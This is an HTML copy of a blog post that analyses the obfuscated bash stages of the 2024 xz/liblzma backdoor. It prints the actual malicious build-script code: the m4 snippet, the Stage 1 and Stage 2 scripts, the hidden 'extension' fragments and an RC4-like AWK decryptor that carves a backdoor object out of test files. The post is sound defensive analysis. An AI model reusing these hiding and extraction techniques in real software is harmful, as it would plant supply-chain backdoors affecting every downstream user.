<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://gynvael.coldwind.pl/?lang=en&amp;id=782">Original</a>
    <h1>Xz/liblzma: Bash-stage Obfuscation Explained</h1>
    
    <div id="readability-page-1" class="page"><div><div><p>Yesterday <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">Andres Freund emailed oss-security@</a> informing the community of the discovery of a backdoor in xz/liblzma, which affected OpenSSH server (huge respect for noticing and investigating this). Andres&#39; email is an amazing summary of the whole drama, so I&#39;ll skip that. While admittedly most juicy and interesting part is the obfuscated binary with the backdoor, the part that caught my attention – and what this blogpost is about – is the initial part in bash and the simple-but-clever obfuscation methods used there. Note that this isn&#39;t a full description of what the bash stages do, but rather a write down of how each stage is obfuscated and extracted.</p>

<p>P.S. Check the comments under this post, there are some good remarks there.</p>

<h2>Before we begin</h2>
<p>We have to start with a few notes.</p>

<p>First of all, there are two versions of xz/liblzma affected: 5.6.0 and 5.6.1. Differences between them are minor, but do exist. I&#39;ll try to cover both of these.</p>

<p>Secondly, the bash part is split into three (four?) stages of interest, which I have named Stage 0 (that&#39;s the start code added in <span>m4/build-to-host.m4</span>) to Stage 2. I&#39;ll touch on the potential &#34;Stage 3&#34; as well, though I don&#39;t think it has fully materialized yet.</p>

<p>Please also note that the obfuscated/encrypted stages and later binary backdoor are hidden in two test files: <span>tests/files/bad-3-corrupt_lzma2.xz</span> and <span>tests/files/good-large_compressed.lzma</span>.</p>


<h2><a href="#stage0">Stage 0</a></h2>
<p>As pointed out by Andres, things start in the <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63"><span>m4/build-to-host.m4</span></a> file. Here are the relevant pieces of code:</p>

<p><code>...
gl_[$1]_config=&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;
...
gl_path_map=&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;
...
</code></p><p>This code, which I believe is run somewhere during the build process, extracts Stage 1 script. Here&#39;s an overview:</p>

<ol>
  <li>Bytes from <span>tests/files/bad-3-corrupt_lzma2.xz</span> are read from the file and outputted to standard output / input of the next step – this chaining of steps is pretty typical throughout the whole process. After everything is read a newline (<span>\n</span>) is added as well.</li>

  <li>The second step is to run <span>tr</span> (translate, as in &#34;map characters to other characters&#34;, or &#34;substitute characters to target characters&#34;), which basically changes selected characters (or byte values) to other characters (other byte values). Let&#39;s work through a few features and examples, as this will be imporant later.</li>

  <li>In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn&#39;t matter as the whole meaningful output has already been written out). The outcome of this is the Stage 1 script, which is promptly executed.</li>
</ol>

<h2><a href="#stage1">Stage 1</a></h2>
<p>In Andres&#39; email that&#39;s the bash file starting with &#34;####Hello####&#34;, which is pretty short, so let&#39;s present it here with differences between 5.6.0 and 5.6.1 <span>marked with black background</span>.</p>

<p><code>####Hello####
<span># <i>a few binary bytes here, but as it&#39;s a comment they are ignorred</i></span>
<span>[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0</span>
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir=&#34;../../$srcdir&#34;
fi
export i=&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c <span>+939</span>)&#34;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c <span>+31233</span>|tr <span>&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> &#34;\0-\377&#34;)|xz -F raw --lzma1 -dc|/bin/sh
####World####
</code></p><p>The first difference are the random bytes in the comment on the second line.</p>

<ul>
  <li>In version 5.6.0 it&#39;s <span>86 F9 5A F7 2E 68 6A BC</span>,</li>
  <li>and in 5.6.1 that&#39;s <span>E5 55 89 B7 24 04 D8 17</span>.</li>
</ul>

<p>I&#39;m not sure if these differences are meaningful in any way, but wanted to note it.</p>

<p>The check whether the script is running on Linux was added in 5.6.1, and the fact that it&#39;s repeated 5 times makes this pretty funny – was someone like &#34;oops, forgot this last time and it cause issues, better put it in 5 times as an atonement!&#34;?</p>

<p>We&#39;ll get back to the remaining differences later, but for now let&#39;s switch to Stage 2 extraction code, which is that huge <span>export i=...</span> line with a lot of heads. As previously, let&#39;s go step by step:</p>

<ol>
  <li>The <span>export i=...</span> at the beginning is basically just a function &#34;definition&#34;. It&#39;s being invoked in step 3 (as well as in Stage 2), so we&#39;ll get to it in a sec (also, it&#39;s simpler than it looks).</li>

  <li>The first actual step in the extraction process of Stage 2 is the decompression (<span>xz -dc</span>) of the <span>good-large_compressed.lzma</span> file to standard output. This, as previously, starts a chain of outputs of one step being used as inputs in the next one.</li>

  <li>Now we get to the <span>i</span> function invocation (<span>eval $i</span>). This function is basically a chain of <span>head</span> calls that either output the next N bytes, or skip (ignore) the next N bytes.</li>

  <li>In the next step – <span>tail -c +31233</span> – the initial portion of the data is discarded (spoiler: it hides the binary backdoor, which is extracted in the next Stage, so it&#39;s not needed now). In 5.6.0 that would be the first 3126<u>4</u> bytes and in the 5.6.1 that&#39;s 3123<u>2</u> (the one-off difference is because of <span>tail -c +N</span> means &#34;start outputting from byte N&#34; and not &#34;ignore first N bytes&#34;).</li>

  <li>Step 5 revisits the <span>tr</span> command, which in this case is used as a very simple substitution cipher, with key (byte value mapping) being different in 5.6.0 and 5.6.1:

    <code>5.6.0: tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34;
5.6.1: tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34;</code>

  As per previous explanation, this basically means that (for 5.6.0) byte of value 5 will be substitute with byte of value 0, byte of value 6 will be substituted with byte of value 1, and so on. In each case there are 6 ranges which map to the whole 0 - 256 (that&#39;s 377 octal) range.</li>

  <li>In the last step the deciphered data is decompressed (<span>xz -F raw --lzma1 -dc</span>) and the resulting Stage 2 is promptly executed.</li>
</ol>

<h2><a href="#stage2">Stage 2</a></h2>
<p>Stage 2 is the <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1">infected.txt</a> file attached by Andres in the original email (that&#39;s the 5.6.0 version btw). There&#39;s a lot going on in this bash script, as this is where the actual compilation process modification happens.</p>

<p>From the perspective of obfuscation analysis, there are three interesting fragments to this script, <b>two of which appear only in the 5.6.1 version</b>. Let&#39;s start with them, as they are also simpler.</p>


<h3><a href="#stage2-ext">Stage 2 &#34;extension&#34; mechanism</a></h3>

<p>Fragment 1:</p>
<p><code>vs=`grep -broaF &#39;~!:_ W&#39; $srcdir/tests/files/ 2&gt;/dev/null`
if test &#34;x$vs&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test &#34;x$f1&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF &#39;|_!{ -&#39; $srcdir/tests/files/ 2&gt;/dev/null`
if test &#34;x$ve&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test &#34;x$f2&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; | xz -F raw --lzma2 -dc`
fi
fi
fi
fi</code></p><p>Fragment 3:</p>
<p><code>vs=`grep -broaF &#39;jV!.^%&#39; $top_srcdir/tests/files/ 2&gt;/dev/null`
if test &#34;x$vs&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test &#34;x$f1&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF &#39;%.R.1Z&#39; $top_srcdir/tests/files/ 2&gt;/dev/null`
if test &#34;x$ve&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test &#34;x$f2&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; | xz -F raw --lzma2 -dc`
fi
fi
fi
fi</code></p><p>These two fragments are pretty much identical, so let&#39;s handle both of them at the same time. Here&#39;s what they do:</p>

<ol>
  <li>First of all they try to find (<span>grep -broaF</span>) two files in <span>tests/files/</span> directory which contain the following bytes (signature):
  <code>Fragment 1: &#34;~!:_ W&#34; and &#34;|_!{ -&#34;
Fragment 3: &#34;jV!.^%&#34; and &#34;%.R.1Z&#34;</code>
  Note that what&#39;s actually outputted by <span>grep</span> in this case has the following format: <span>file_name:offset:signature</span>. For example:
  <code>$ grep -broaF &#34;XYZ&#34;
testfile:9:XYZ</code><br/>
  </li>

  <li>If such file is found, the offset for each file is extracted (<span>cut -d: -f2</span>, which takes the 2nd field assuming : is the field delimiter), and the first offset + 7 is saved as <span>$start</span>, and the second offset from the second file is saved as <span>$end</span>.</li>

  <li>Once the script has the <span>$start</span> and <span>$end</span> offsets, it carves out that part of the file-that-had-the-first-signature:
    <code>cat $f1 | tail -c +${start} | head -c +${end}</code><br/></li>

  <li>And what follows is first the substitution cipher (using the 5.6.0 version key from Stage 1 btw):
    <code>tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34;</code><br/>
  </li>

  <li>and then decompressing the data for it to be promptly executed:
    <code>eval `... | xz -F raw --lzma2 -dc`</code>
  </li>

</ol>

<p>Note that in neither of the investigated TAR archives (5.6.0 and 5.6.1) there were any files with any of the signatures. This whole thing basically looks like an &#34;extension/patching&#34; system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a &#34;bad&#34; and &#34;good&#34; test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed.</p>

<h3><a href="#stage2-backdoor">Stage 2 backdoor extraction</a></h3>

<p>As pointed out by Andres in the original e-mail, at some point an .o file is extracted and weaved into the compilation/linking process. The following code is responsible for that (again, differences between versions are <span>marked with black background</span>):</p>

<p><code>N=0
W=<span>88664</span>
else
N=<span>88664</span>
W=0
fi
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34; | LC_ALL=C awk &#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;<span>8192</span>;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &#34;%c&#34;,(v+k)%m}&#39; | xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true</code></p><p>The differences between versions boil down to the size of the compressed-but-somewhat-mangled payload – that&#39;s 88792 in 5.6.0 and 88664 in 5.6.1 – and one value change in the AWK script, to which we&#39;ll get in a second.</p>

<p>As in all previous cases, the extraction process is a chain of commands, where the output of one command is the input of the next one. Furthermore, actually some steps are identical as in Stage 1 (which makes sense, since – as I&#39;ve mentioned – they binary payload resides in the previously ignored part of the &#34;good&#34; file data). Let&#39;s take a look:</p>

<ol>
  <li>The first step is identical as step 2 in Stage 1 – the <span>tests/files/good-large_compressed.lzma</span> file is being extracted with xz.</li>

  <li>Second step is in turn identical as step 3 in Stage 1 – that was the &#34;a lot of heads&#34; &#34;function&#34; invocation.</li>

  <li>And here is where things diverge. First of all, the previous output get&#39;s mangled with the <span>sed</span> command:
    <code>LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34;</code>
  What this does, is actually putting a newline character after each byte (with the exception of the new line character itself). So what we end up with on the output, is a byte-per-line situation (yes, there is a lot of mixing &#34;text&#34; and &#34;binary&#34; approaches to files in here). This is actually needed by the next step.</li>

  <li>The next step is an AWK script (that&#39;s a simple scripting language for text processing) which does – as mak pointed out for me – <a href="https://en.wikipedia.org/wiki/RC4">RC4...ish</a> decription of the input stream. Here&#39;s a prettyfied version of that script:
    <code>BEGIN {  # Initialization part.
  FS = &#34;\n&#34;;  # Some AWK settings.
  RS = &#34;\n&#34;;
  ORS = &#34;&#34;;
  m = 256;
  for(i=0;i&lt;m;i++) {
    t[sprintf(&#34;x%key&#34;, i)] = i;
    key[i] = ((i * 7) + 5) % m;  # Creating the cipher key.
  }
  i=0;  # Skipping 4096 first bytes of the output PRNG stream.
  j=0;  # ↑ it&#39;s a typical RC4 thing to do.
  for(l = 0; l &lt; 4096; l++) {  # 5.6.1 uses 8192 instead.
    i = (i + 1) % m;
    a = key[i];
    j = (j + a) % m;
    key[i] = key[j];
    key[j] = a;
  }
}

{  # Decription part.
  # Getting the next byte.
  v = t[&#34;x&#34; (NF &lt; 1 ? RS : $1)];

  # Iterating the RC4 PRNG.
  i = (i + 1) % m;
  a = key[i];
  j = (j + a) % m;
  b = key[j];
  key[i] = b;
  key[j] = a;
  k = key[(a + b) % m];

  # As pointed out by <a href="https://twitter.com/nugxperience/status/1773906926503591970">@nugxperience</a>, RC4 originally XORs the encrypted byte
  # with the key, but here for some add is used instead (might be an AWK thing).
  printf &#34;%key&#34;, (v + k) % m
}</code><br/></li>

  <li>After the input has been decrypted, it gets decompressed:
    <code>xz -dc --single-stream</code><br/></li>

    <li>And then bytes from N (0) to W (~86KB) are being carved out using the same usual <span>head</span> tricks, and saved as <span>liblzma_la-crc64-fast.o</span> – which is the final binary backdoor.
      <code>((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o</code>
    </li>

</ol>

<h2>Summary</h2>
<p>Someone put a lot of effort for this to be pretty innocent looking and decently hidden. From binary test files used to store payload, to file carving, substitution ciphers, and an RC4 variant implemented in AWK all done with just standard command line tools. And all this in 3 stages of execution, and with an &#34;extension&#34; system to future-proof things and not have to change the binary test files again. I can&#39;t help but wonder (as I&#39;m sure is the rest of our security community) – if this was found by accident, how many things still remain undiscovered.</p>
</div>
        
        </div></div>
  </body>
</html>
